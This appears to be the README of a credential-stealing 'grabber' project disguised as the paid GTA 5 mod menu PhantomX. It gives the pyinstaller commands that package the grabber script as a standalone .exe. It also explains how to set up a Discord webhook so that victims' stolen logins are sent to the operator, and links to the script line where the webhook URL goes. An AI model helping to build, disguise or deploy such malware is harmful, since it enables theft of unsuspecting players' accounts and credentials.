# What is PhantomX?
PhantomX is a paid mod menu for GTA 5.

# How do I turn this to a .exe?
Just run these commands:
```
pip install pyinstaller
pyinstaller --onefile pathToMyGrabberMain.py
```

# How do I get their logins sent to me?
You'll need to create a discord server with a channel and create a channel webhook and put the webhook URL in the script [at this line here.](https://github.com/iUseYahoo/PhantomX-Grabber/blob/main/main.py#L3)
